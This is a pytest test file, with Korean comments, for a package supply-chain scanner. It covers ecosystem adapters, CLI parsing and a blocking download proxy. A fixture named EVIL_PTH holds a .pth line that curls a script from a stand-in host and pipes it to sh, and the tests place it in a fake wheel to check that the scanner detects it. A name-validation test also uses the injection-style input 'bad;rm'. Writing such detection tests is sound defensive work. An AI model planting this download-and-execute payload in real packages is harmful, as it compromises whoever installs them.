"""다중 생태계 파이프라인 — 어댑터 계약으로 run_scan 이 생태계를 모르고 돌아가는지.

전부 오프라인이다: 레지스트리·OSV·아카이브 다운로드는 httpx.MockTransport 로, 생태계는
테스트 안의 가짜 어댑터로 대체한다(다른 세션의 실제 어댑터가 병합돼도 결과가 같게).
"""

from __future__ import annotations

import io
import json
import tarfile
import zipfile
from datetime import UTC, datetime

import httpx
import pytest
from fastapi.testclient import TestClient

import ecosystems
from api.routers import scan
from api.schemas import Ecosystem, ScanRequest, Severity, StaticFinding
from api.storage import ScanStore
from ecosystems.base import Artifact, Project, Release
from ecosystems.base import Ecosystem as EcoBase

# ──────────────────────────────
# 도우미
# ──────────────────────────────


def make_tar(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_zip(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in files.items():
            zf.writestr(name, data)
    return buf.getvalue()


class FakeEco(EcoBase):
    """npm 자리에 끼우는 가짜 어댑터. 'EVIL' 이 든 파일마다 HIGH 하나를 낸다."""

    id = "npm"
    osv_ecosystem = "npm"
    purl_type = "npm"
    registry_label = "npm"

    def __init__(self, project: Project) -> None:
        self.project = project
        self.analyzed: list[str] = []

    async def fetch_project(self, name, *, client):
        return self.project

    def analyze_tree(self, tree, *, artifact=None):
        self.analyzed.append(artifact.filename if artifact else "")
        out = []
        for rel in tree.files():
            text = tree.read(rel) or ""
            if "EVIL" in text:
                out.append(StaticFinding(
                    rule="npm-test-evil", cwe="CWE-506", severity=Severity.HIGH,
                    location=f"{rel}:1", detail="test payload",
                ))
        return out

    def typosquat_score(self, name):
        return 0.5

    def has_install_script(self, project, version, archive_names):
        return "package/install.js" in archive_names


def _project(files: dict[str, bytes], name="left-pad") -> Project:
    art = Artifact(filename=f"{name}-1.0.0.tgz", url=f"https://reg.fake/{name}-1.0.0.tgz",
                   kind="tarball")
    return Project(
        ecosystem="npm", name=name, latest="1.0.0",
        releases={"1.0.0": Release(
            version="1.0.0", uploaded_at=datetime(2020, 1, 1, tzinfo=UTC),
            artifacts=[art], dependencies=["a", "b"],
        )},
    )


def _transport(archive: bytes, seen: dict):
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "api.osv.dev":
            seen["osv"] = json.loads(request.content)
            return httpx.Response(200, json={})
        seen.setdefault("downloads", []).append(str(request.url))
        return httpx.Response(200, content=archive)

    return httpx.MockTransport(handler)


@pytest.fixture()
def fake_npm(monkeypatch):
    real_get = ecosystems.get
    holder: dict = {}

    def get(eco_id):
        if eco_id == "npm":
            return holder["eco"]
        return real_get(eco_id)

    monkeypatch.setattr(ecosystems, "get", get)
    monkeypatch.setattr(scan, "OFFLINE_DEMO", False)

    async def _no_tagging(vulns, http):
        return None

    monkeypatch.setattr(scan, "tag_vulnerabilities", _no_tagging)
    return holder


async def _run(req, archive, tmp_path, seen, **kw):
    store = ScanStore(str(tmp_path / "m.db"))
    await store.init()
    async with httpx.AsyncClient(transport=_transport(archive, seen)) as http:
        return await scan.run_scan(req, http=http, store=store, **kw)


# ──────────────────────────────
# A1. 스키마
# ──────────────────────────────


def test_schema_ecosystem_matches_known_ids():
    assert tuple(e.value for e in Ecosystem) == ecosystems.KNOWN_IDS


def test_unimplemented_ecosystem_is_422_not_500(tmp_path, monkeypatch):
    """어댑터가 아직 병합되지 않은 생태계 — 서버 오류가 아니라 사유 있는 422."""
    from api.main import app

    real_get = ecosystems.get

    def get(eco_id):
        if eco_id == "cargo":
            raise ecosystems.UnknownEcosystem("cargo 어댑터가 아직 없습니다")
        return real_get(eco_id)

    monkeypatch.setattr(ecosystems, "get", get)
    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "x.db"))
    with TestClient(app) as c:
        r = c.post("/api/v1/scan", json={"ecosystem": "cargo", "name": "serde", "version": "1.0"})
    assert r.status_code == 422
    assert "지원하지 않습니다" in r.text


@pytest.mark.parametrize(
    "name",
    [
        "org.apache.commons:commons-lang3",          # Maven group:artifact
        "github.com/hashicorp/terraform-plugin-sdk/v2",  # Go 모듈 경로
        "@angular/core",                              # npm 스코프
        "a" * 300,                                    # 예전 Field 상한(214) 초과
    ],
)
def test_field_limits_leave_room_for_other_ecosystems(fake_npm, name):
    """Field 단계 상한이 다른 생태계의 정상 이름을 자르지 않는다 (판단은 어댑터 몫)."""

    class Lenient(FakeEco):
        def validate(self, n, v):
            return None

    fake_npm["eco"] = Lenient(_project({}))
    req = ScanRequest(ecosystem="npm", name=name, version="1.0.0")
    assert req.name == name


def test_validation_is_delegated_to_the_adapter(fake_npm):
    calls = []

    class Spy(FakeEco):
        def validate(self, n, v):
            calls.append((n, v))
            raise ValueError("어댑터가 거절함")

    fake_npm["eco"] = Spy(_project({}))
    with pytest.raises(ValueError, match="어댑터가 거절함"):
        ScanRequest(ecosystem="npm", name="x", version="1")
    assert calls == [("x", "1")]


def test_pip_keeps_its_rules_and_wording():
    with pytest.raises(ValueError, match="PEP 503"):
        ScanRequest(name="bad;rm", version="1.0")
    with pytest.raises(ValueError, match="PEP 440"):
        ScanRequest(name="ok", version="1.0~1")  # base 기본 정규식은 ~ 를 받지만 pip 은 아니다
    with pytest.raises(ValueError):
        ScanRequest(name="a" * 215, version="1.0")  # pip 의 이름 상한은 그대로 214


# ──────────────────────────────
# A4. run_scan — 가짜 어댑터로 끝에서 끝까지
# ──────────────────────────────


async def test_run_scan_end_to_end_with_fake_adapter(fake_npm, tmp_path, monkeypatch):
    archive = make_tar({
        "package/package.json": b'{"name": "left-pad"}',
        "package/install.js": b"EVIL()\n",
    })
    eco = FakeEco(_project({}))
    fake_npm["eco"] = eco

    bandit_called = []

    async def spy_bandit(req, ctx, errors):
        bandit_called.append(req.name)
        return []

    monkeypatch.setattr(scan, "_layer_bandit", spy_bandit)

    seen: dict = {}
    res = await _run(ScanRequest(ecosystem="npm", name="left-pad", version="1.0.0"),
                     archive, tmp_path, seen)

    assert seen["osv"]["package"] == {"name": "left-pad", "ecosystem": "npm"}
    assert eco.analyzed == ["left-pad-1.0.0.tgz"]
    assert [f.rule for f in res.static_findings] == ["npm-test-evil"]
    assert res.static_findings[0].location == "package/install.js:1"
    assert res.verdict.value == "block"
    assert bandit_called == [], "Bandit 은 파이썬 전용"
    # 스코어링은 Project 모델 + 어댑터 신호만 본다
    assert res.risk_signals.typosquat_score == 0.5
    assert res.risk_signals.has_install_script is True
    assert res.risk_signals.dependency_count == 2
    assert res.ecosystem is Ecosystem.NPM
    assert res.layer_errors == []


async def test_not_found_message_uses_registry_label(fake_npm, tmp_path):
    """설계 문서 §3.1 의 형식 — 감시기가 ' is not on ' 으로 삭제 여부를 가린다."""
    from common.pypi import PackageNotFound

    class Gone(FakeEco):
        async def fetch_project(self, name, *, client):
            raise PackageNotFound(
                f"{name} is not on {self.registry_label} (never existed, or removed)"
            )

    fake_npm["eco"] = Gone(_project({}))
    res = await _run(ScanRequest(ecosystem="npm", name="ghost", version="1.0.0"),
                     b"", tmp_path, {})
    assert "static: ghost is not on npm (never existed, or removed)" in res.layer_errors


def test_guarded_hooks_are_optional():
    """병합 순서와 무관하게 import 되어야 한다 — 없으면 None, 있으면 호출 가능."""
    assert scan.escalate_new_behaviors is None or callable(scan.escalate_new_behaviors)
    from api import main
    from cli import su_scan

    assert main.npm_proxy is None or hasattr(main.npm_proxy, "router")
    assert su_scan._register_project_cmd is None or callable(su_scan._register_project_cmd)


async def test_escalate_hook_is_called_for_pip(monkeypatch, tmp_path):
    """version_diff 가 있으면 정적 결과에 덧붙이고, 그 오류는 미검사로 치지 않는다."""
    extra = StaticFinding(rule="custom-new-behavior", cwe="CWE-506", severity=Severity.MEDIUM,
                          location="pkg/__init__.py:1", detail="new")
    got = {}

    async def fake_escalate(ctx, findings, *, errors):
        got["ctx"] = ctx
        errors.append("static: 직전 버전을 받지 못함")
        return [extra]

    async def fake_static(req, ctx, errors):
        return []

    async def fake_cve(req, http, errors):
        return []

    async def fake_scoring(req, ctx, errors):
        return scan._NEUTRAL_SIGNALS, 0

    monkeypatch.setattr(scan, "escalate_new_behaviors", fake_escalate)
    monkeypatch.setattr(scan, "_layer_static", fake_static)
    monkeypatch.setattr(scan, "_layer_cve", fake_cve)
    monkeypatch.setattr(scan, "_layer_scoring", fake_scoring)
    monkeypatch.setattr(scan, "OFFLINE_DEMO", False)
    store = ScanStore(str(tmp_path / "e.db"))
    await store.init()
    async with httpx.AsyncClient() as http:
        res = await scan.run_scan(ScanRequest(name="pkg", version="1.0"), http=http,
                                  store=store, bandit=False)
    assert got["ctx"].name == "pkg"
    assert extra in res.static_findings
    assert "static: 직전 버전을 받지 못함" in res.layer_errors
    assert res.verdict.value == "safe"


# ──────────────────────────────
# A2. pip 어댑터
# ──────────────────────────────


def _pypi_payload():
    def f(fn, kind, t, yanked=False):
        return {"filename": fn, "packagetype": kind, "url": f"https://files.pythonhosted.org/{fn}",
                "size": 10, "upload_time_iso_8601": t, "yanked": yanked,
                "digests": {"sha256": "ab" * 32}}

    return {
        "info": {"version": "2.0", "requires_dist": ["urllib3 (>=1)", "PySocks ; extra == 'socks'",
                                                     "Charset_Normalizer"]},
        "releases": {
            "1.0": [f("p-1.0.tar.gz", "sdist", "2020-01-01T00:00:00Z")],
            "1.5": [f("p-1.5.tar.gz", "sdist", "2021-01-01T00:00:00Z", yanked=True)],
            "2.0": [
                f("p-2.0-cp312-cp312-manylinux.whl", "bdist_wheel", "2022-01-02T00:00:00Z"),
                f("p-2.0-py3-none-any.whl", "bdist_wheel", "2022-01-01T05:00:00Z"),
                f("p-2.0.tar.gz", "sdist", "2022-01-01T00:00:00Z"),
            ],
        },
    }


def test_pip_project_model_conversion():
    from common.pypi import ProjectData
    from ecosystems.pip.registry import to_project

    payload = _pypi_payload()
    p = to_project(ProjectData(name="p", info=payload["info"], releases=payload["releases"]))
    assert p.latest == "2.0"
    assert p.releases["2.0"].uploaded_at == datetime(2022, 1, 1, tzinfo=UTC)
    assert p.releases["1.5"].yanked and not p.releases["1.0"].yanked
    assert p.releases["2.0"].dependencies == ["urllib3", "charset-normalizer"]
    assert p.releases["1.0"].dependencies == []  # JSON 이 최신 것만 준다 — 지어내지 않는다
    # 철회된 1.5 는 건너뛴다
    assert p.previous_version("2.0") == "1.0"
    assert p.releases["2.0"].artifacts[0].sha256 == "ab" * 32


def test_pip_selects_sdist_and_pure_wheel():
    from common.pypi import ProjectData
    from ecosystems.pip.registry import to_project

    payload = _pypi_payload()
    p = to_project(ProjectData(name="p", info=payload["info"], releases=payload["releases"]))
    picked = ecosystems.get("pip").select_artifacts(p, "2.0")
    assert [a.filename for a in picked] == ["p-2.0.tar.gz", "p-2.0-py3-none-any.whl"]


def test_pip_adapter_contract_values():
    pip = ecosystems.get("pip")
    assert (pip.id, pip.osv_ecosystem, pip.registry_label) == ("pip", "PyPI", "PyPI")
    # 어댑터 도입 전 scoring 의 값과 같다
    from scoring.features import typosquat_score

    assert pip.typosquat_score("reqeusts") == typosquat_score("reqeusts")
    assert pip.has_install_script(None, "1", ["p-1.0/setup.py"]) is True
    assert pip.has_install_script(None, "1", ["p/__init__.py"]) is False


# ──────────────────────────────
# A6. CLI 생태계 지정
# ──────────────────────────────


@pytest.mark.parametrize(
    ("spec", "default", "expected"),
    [
        ("requests==2.31.0", "pip", ("pip", "requests", "2.31.0")),
        ("requests", "pip", ("pip", "requests", None)),
        ("npm:lodash@4.17.21", "pip", ("npm", "lodash", "4.17.21")),
        ("npm:@angular/core@17.0.0", "pip", ("npm", "@angular/core", "17.0.0")),
        ("@angular/core", "npm", ("npm", "@angular/core", None)),
        ("serde@1.0.200", "cargo", ("cargo", "serde", "1.0.200")),
        ("maven:org.apache:commons@1.0", "pip", ("maven", "org.apache:commons", "1.0")),
        ("org.apache:commons@1.0", "maven", ("maven", "org.apache:commons", "1.0")),
    ],
)
def test_cli_parses_ecosystem_targets(spec, default, expected):
    from cli.su_scan import _parse_target

    assert _parse_target(spec, default) == expected


def test_cli_install_is_pip_only():
    from typer.testing import CliRunner

    from cli.su_scan import app

    r = CliRunner().invoke(app, ["install", "npm:lodash@4.17.21"])
    assert r.exit_code == 2
    assert "pip 전용" in r.output


# ──────────────────────────────
# B. 우회 1 — 스캔한 파일 = 설치되는 파일
# ──────────────────────────────

EVIL_PTH = b'import os;os.system("curl http://x.example/a|sh")\n'
CLEAN_SDIST = make_tar({"p-1.0/setup.py": b"from setuptools import setup\nsetup()\n",
                        "p-1.0/p/__init__.py": b"x = 1\n"})
EVIL_WHEEL = make_zip({"p/__init__.py": b"x = 1\n", "evil.pth": EVIL_PTH,
                       "p-1.0.dist-info/WHEEL": b"Wheel-Version: 1.0\n"})


def _pypi_transport(files: dict[str, bytes], seen: dict) -> httpx.MockTransport:
    """PyPI JSON + 파일 + OSV. ``files`` 는 파일명 → 내용."""

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "api.osv.dev":
            return httpx.Response(200, json={})
        if request.url.path.endswith("/json"):
            return httpx.Response(200, json={
                "info": {"version": "1.0", "requires_dist": []},
                "releases": {"1.0": [
                    {"filename": fn, "url": f"https://files.pythonhosted.org/x/{fn}",
                     "packagetype": "bdist_wheel" if fn.endswith(".whl") else "sdist",
                     "size": len(data), "upload_time_iso_8601": "2020-01-01T00:00:00Z"}
                    for fn, data in files.items()
                ]},
            })
        fn = request.url.path.rsplit("/", 1)[-1]
        seen.setdefault("downloads", []).append(fn)
        return httpx.Response(200, content=files[fn])

    return httpx.MockTransport(handler)


async def _run_pip(files, tmp_path, seen, **kw):
    store = ScanStore(str(tmp_path / "p.db"))
    await store.init()
    async with httpx.AsyncClient(transport=_pypi_transport(files, seen)) as http:
        return await scan.run_scan(ScanRequest(name="p", version="1.0"), http=http,
                                   store=store, bandit=False, **kw)


@pytest.fixture()
def online(monkeypatch):
    monkeypatch.setattr(scan, "OFFLINE_DEMO", False)

    async def _no_tagging(vulns, http):
        return None

    monkeypatch.setattr(scan, "tag_vulnerabilities", _no_tagging)


async def test_regression_clean_sdist_with_malicious_wheel_is_blocked(online, tmp_path):
    """우회 재현: 예전 select_artifact 는 sdist 만 봐서 safe 였다. pip 은 wheel 을 설치한다."""
    seen: dict = {}
    res = await _run_pip({"p-1.0.tar.gz": CLEAN_SDIST, "p-1.0-py3-none-any.whl": EVIL_WHEEL},
                         tmp_path, seen)
    assert sorted(seen["downloads"]) == ["p-1.0-py3-none-any.whl", "p-1.0.tar.gz"]
    assert res.verdict.value == "block"
    pth = [f for f in res.static_findings if f.rule == "custom-pth"]
    # 주 아티팩트(sdist)가 아닌 파일의 탐지는 어느 파일에서 나왔는지 위치에 밝힌다
    assert [f.location for f in pth] == ["p-1.0-py3-none-any.whl!evil.pth:1"]


async def test_same_finding_in_sdist_and_wheel_is_reported_once(online, tmp_path):
    sdist = make_tar({"p-1.0/evil.pth": EVIL_PTH})
    wheel = make_zip({"evil.pth": EVIL_PTH})
    res = await _run_pip({"p-1.0.tar.gz": sdist, "p-1.0-py3-none-any.whl": wheel},
                         tmp_path, {})
    pth = [f for f in res.static_findings if f.rule == "custom-pth"]
    assert [f.location for f in pth] == ["p-1.0/evil.pth:1"]


async def test_explicit_artifact_scans_only_that_file(online, tmp_path):
    seen: dict = {}
    wheel = Artifact(filename="p-1.0-py3-none-any.whl",
                     url="https://files.pythonhosted.org/x/p-1.0-py3-none-any.whl", kind="wheel")
    res = await _run_pip({"p-1.0.tar.gz": CLEAN_SDIST, "p-1.0-py3-none-any.whl": EVIL_WHEEL},
                         tmp_path, seen, artifacts=[wheel])
    assert seen["downloads"] == ["p-1.0-py3-none-any.whl"]
    # 명시한 파일이 주 아티팩트다 — 접두사 없음
    assert "evil.pth:1" in [f.location for f in res.static_findings]


def test_regression_proxy_scans_the_requested_wheel(online, tmp_path, monkeypatch):
    """/files/<wheel> 은 name==version 이 아니라 그 wheel 자체를 스캔해야 한다."""
    from api.main import app

    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "proxy.db"))
    seen: dict = {}
    files = {"p-1.0.tar.gz": CLEAN_SDIST, "p-1.0-py3-none-any.whl": EVIL_WHEEL}
    with TestClient(app) as c:
        app.state.http = httpx.AsyncClient(transport=_pypi_transport(files, seen))
        r = c.get("/files/p-1.0-py3-none-any.whl",
                  params={"u": "https://files.pythonhosted.org/x/p-1.0-py3-none-any.whl"})
    assert r.status_code == 403
    assert r.json()["error"] == "blocked_by_supply_unchained"
    assert seen["downloads"] == ["p-1.0-py3-none-any.whl"], "sdist 를 대신 스캔했다"


def test_proxy_passes_clean_requested_file(online, tmp_path, monkeypatch):
    from api.main import app

    monkeypatch.setenv("SU_DB_PATH", str(tmp_path / "proxy2.db"))
    seen: dict = {}
    files = {"p-1.0.tar.gz": CLEAN_SDIST}
    with TestClient(app) as c:
        app.state.http = httpx.AsyncClient(transport=_pypi_transport(files, seen))
        r = c.get("/files/p-1.0.tar.gz",
                  params={"u": "https://files.pythonhosted.org/x/p-1.0.tar.gz"})
    assert r.status_code == 200
    assert r.content == CLEAN_SDIST
